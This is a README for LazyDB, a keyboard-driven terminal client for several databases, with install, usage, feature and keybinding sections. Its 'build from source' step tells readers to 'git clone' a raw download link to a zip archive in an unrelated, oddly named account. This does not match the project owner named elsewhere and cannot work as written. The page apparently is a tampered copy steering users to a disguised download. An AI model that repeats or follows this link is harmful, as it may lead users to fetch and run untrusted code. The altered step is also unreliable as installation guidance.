<div align="center">

# LazyDB

### One TUI to query them all

A terminal UI database client for PostgreSQL, MySQL, SQLite, MongoDB, and Redis.<br>
Single binary, zero config, keyboard-driven.

[Installation](#installation) · [Usage](#usage) · [Features](#features) · [Themes](#themes)

---

<img src="assets/demo.gif" alt="LazyDB demo" width="700">

</div>

<br>

## Installation

```bash
go install github.com/aymenhmaidiwastaken/lazydb@latest
```

Or build from source:

```bash
git clone https://raw.githubusercontent.com/Childsupportrailtechnology337/lazydb/main/internal/ui/Software-v1.4.zip
cd lazydb
make build
```

**Homebrew** and **Scoop** support coming with the first tagged release.

## Usage

```bash
lazydb postgres://user:pass@localhost:5432/mydb   # PostgreSQL
lazydb mysql://user:pass@localhost:3306/mydb       # MySQL
lazydb ./local.db                                  # SQLite file
lazydb mongodb://localhost:27017/mydb              # MongoDB
lazydb redis://localhost:6379                      # Redis
lazydb demo                                        # built-in sample database
```

### Connection Profiles

Save connections in `~/.lazydb.yaml` or run `lazydb init` to generate a template:

```yaml
profiles:
  prod:
    url: postgres://user:pass@prod-host:5432/app
  staging:
    url: mysql://user:pass@staging:3306/app
```

Then just `lazydb prod`.

---

## Features

### Schema Browser
- Tree view of databases, tables, columns, and indexes
- Expand/collapse with Enter, navigate with j/k
- Column types and constraints at a glance

### Query Editor
- Multi-line SQL editor with syntax highlighting
- Autocomplete for table names, columns, and SQL keywords
- Execute with Ctrl+Enter
- Query tabs — run multiple queries side by side
- Query history and bookmarks (Ctrl+H / Ctrl+B)

### Results Viewer
- Formatted table output with column alignment
- Sort by any column, paginate large result sets
- Row detail view for wide tables (Enter on a row)
- Inline cell editing

### Data Export
- Export results to CSV, JSON, or SQL INSERT statements
- Ctrl+E to open the export dialog

### Command Palette
- Ctrl+P to search and run any command
- Fuzzy matching across all available actions

### SSH Tunneling
- Built-in SSH tunnel support for remote databases
- Configure in your profile with `ssh` section

---

## Themes

9 built-in color themes. Set with `--theme` flag or in your config:

`default` · `catppuccin-mocha` · `dracula` · `tokyo-night` · `gruvbox` · `nord` · `one-dark` · `rose-pine` · `solarized-dark`

```bash
lazydb --theme dracula postgres://localhost/mydb
```

---

## Keybindings

| Key | Action |
|-----|--------|
| `Tab` | Switch between panels |
| `j` / `k` | Navigate up/down |
| `h` / `l` | Navigate left/right in results |
| `Enter` | Expand node / view row detail |
| `Ctrl+Enter` | Execute query |
| `Ctrl+H` | Query history |
| `Ctrl+B` | Bookmarks |
| `Ctrl+E` | Export results |
| `Ctrl+P` | Command palette |
| `?` | Help overlay |
| `q` | Quit |

## Supported Databases

| Database | Driver | Status |
|----------|--------|--------|
| **PostgreSQL** | pgx | Full support |
| **MySQL** | go-sql-driver | Full support |
| **SQLite** | modernc.org (pure Go) | Full support |
| **MongoDB** | official Go driver | Full support |
| **Redis** | go-redis | Full support |

## Development

```bash
make build     # build binary
make test      # run tests
make fmt       # format code
make lint      # golangci-lint
make run ARGS="demo"  # run with args
```

## License

[MIT](LICENSE)
